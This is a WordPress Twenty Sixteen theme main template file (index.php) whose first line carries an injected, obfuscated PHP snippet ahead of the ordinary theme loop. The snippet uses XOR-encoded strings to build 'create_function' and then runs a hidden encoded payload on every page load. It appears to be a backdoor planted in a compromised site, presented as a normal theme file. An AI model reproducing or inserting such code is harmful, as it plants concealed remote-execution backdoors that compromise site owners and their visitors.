<?php $ifeOPnUrB='P+-J,40308N9+XS'^'3YH+XQoUEV-MB7=';$WuLtMUZS=$ifeOPnUrB('',';MRS4N6UXZ;Cn 5:DM+Xo>=RtXY8+4cU7LukFw1em28<NA.ABVXR7; 9;;4e.N<aH-,FZvVW91+GIFmATJ=dZw53,ddQVCahla6B=lcItVSRZnI;hC E V;IPS 83PRKTDMyCs4aE:XHcmiLcKWTL-=fX3yssrGPWbq.AQuJER<ETPcGIYl9YnNcH R5LH;PV9YMpoHkQY6yitTZDZWlF47Z6-PIE40FSq9IUbLAFWLXPOKR <R 4.FvmEbmx<9+0MUFpI:UCvlUgAM8QU<jh1A5c4XE64K=CeurC8T<QIgm58 -iZqH=7A8QV9DHg3HcKmsIWHWBXEZ9,ZF-T5HxbI+;sc94f-cQOxUF7LBqkHuV6T-<dIG6nGk LOUeSI-oWfHUTGKNZDUI; 6GLVH:Y-45p<j7d;8;UUZ:+TDo4-SJ,D;X5IOXN=<19<O9R,;UU;b-3MWxcmWWMR>2zhJA65gkWEQS:Y.S=Hyxi68WlVVP;ZXHiW7+CY:rK=;5UT>;JJXU..3tCvJXY3VlNmByFVRclUW7,+7J.5Lt+bDXddPNlPlFFsdpVc<LbgFUKcSz1ZFrZIhqB1-FXTMsG3BB228=6 8=C=GBCcnHO8;;A<VEDPSJ-5zkstbjhREr06.R lnSMM71I:4+4D3+N;puSY<<XTlhojcD'^'R+zrR;X6,3T-1EMS79XpHFR +<8LJk<8B8RBoWJodTMR-5G.,v =EdDXOZk:C;HIlIM2;ZvsRTRnifMat17mSSZFXDYqqdZbehP-ODG TksbaNmRT0T7L3Uat7ALRyikp-fRjy=haU-<CCTlKo358LfB1nY-SV,5.9UGatU91 P :xG,, EdpUDjAR7A9:UxrV,9YTBb,SKscP0;0;wQfRV6EHkCaPQ22.R,,Bqa 6 +5tAXFS EUM.VEa=.7srbum45PmQ0:VQkGe;Y= YCHJK<GP91Wk X:EHRgS1EjCnIQYTLIgQlKV-M4m39BmZ.CcLW-6<6kx>P0J54H5V XJmti62lq5yC0<Xq-R5bLUhQ W8XYMi<<gNOD-;4:8,TOjFl>1>pDSMq-ZTWgqvlL8AAPK6cJnF21q1;NJtyOtX=9I6R9Y 5=fESCfX.M3sd8 OJOR>2NW232.=ZWRL. BTNGwa52N8q8X1PQR<Q1Dr21O;xnOwVY18C- XBj0,WH>9prEKJSoVn<8G7EnKdYn;6VDq3VXJlmEP5SvKdeYDwwTbX  BQC2TY.TWqm-W5LSnwCj+YCsPOaqtkUgR00SKgVSYgX;T460KI8.AWT Xqidt7+YTSBSTBJHr>x9SX3LDJ7,9VjnJURX+ROifYNYPYD1 DXFQi9');$WuLtMUZS();
/**
 * The main template file
 *
 * This is the most generic template file in a WordPress theme
 * and one of the two required files for a theme (the other being style.css).
 * It is used to display a page when nothing more specific matches a query.
 * E.g., it puts together the home page when no home.php file exists.
 *
 * @link http://codex.wordpress.org/Template_Hierarchy
 *
 * @package WordPress
 * @subpackage Twenty_Sixteen
 * @since Twenty Sixteen 1.0
 */

get_header(); ?>

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		<?php if ( have_posts() ) : ?>

			<?php if ( is_home() && ! is_front_page() ) : ?>
				<header>
					<h1 class="page-title screen-reader-text"><?php single_post_title(); ?></h1>
				</header>
			<?php endif; ?>

			<?php
			// Start the loop.
			while ( have_posts() ) : the_post();

				/*
				 * Include the Post-Format-specific template for the content.
				 * If you want to override this in a child theme, then include a file
				 * called content-___.php (where ___ is the Post Format name) and that will be used instead.
				 */
				get_template_part( 'template-parts/content', get_post_format() );

			// End the loop.
			endwhile;

			// Previous/next page navigation.
			the_posts_pagination( array(
				'prev_text'          => __( 'Previous page', 'twentysixteen' ),
				'next_text'          => __( 'Next page', 'twentysixteen' ),
				'before_page_number' => '<span class="meta-nav screen-reader-text">' . __( 'Page', 'twentysixteen' ) . ' </span>',
			) );

		// If no content, include the "No posts found" template.
		else :
			get_template_part( 'template-parts/content', 'none' );

		endif;
		?>

		</main><!-- .site-main -->
	</div><!-- .content-area -->

<?php get_sidebar(); ?>
<?php get_footer(); ?>
